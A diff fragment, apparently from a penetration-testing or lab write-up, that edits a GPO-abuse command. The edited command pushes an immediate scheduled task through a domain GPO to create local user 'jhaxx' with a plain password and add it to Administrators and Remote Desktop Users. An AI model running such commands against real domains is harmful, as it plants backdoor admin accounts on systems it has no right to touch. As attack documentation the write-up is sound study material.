@@ -410,7 +410,7 @@ Cross-reference GUIDs against BloodHound to identify which GPO `greg.shields` ha
   -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' \
   -dc-ip <DC_IP> \
   -f \
-  -command 'net user jhaxx REDACTED /add && net localgroup administrators jhaxx /add && net localgroup "Remote Desktop Users" jhaxx /add'
+  -command 'net user jhaxx P@ss123! /add && net localgroup administrators jhaxx /add && net localgroup "Remote Desktop Users" jhaxx /add'
 ```
 
 Creates a local admin user, adds to **Administrators** and **Remote Desktop Users**. The Immediate Scheduled Task fires without requiring `gpupdate /force`.
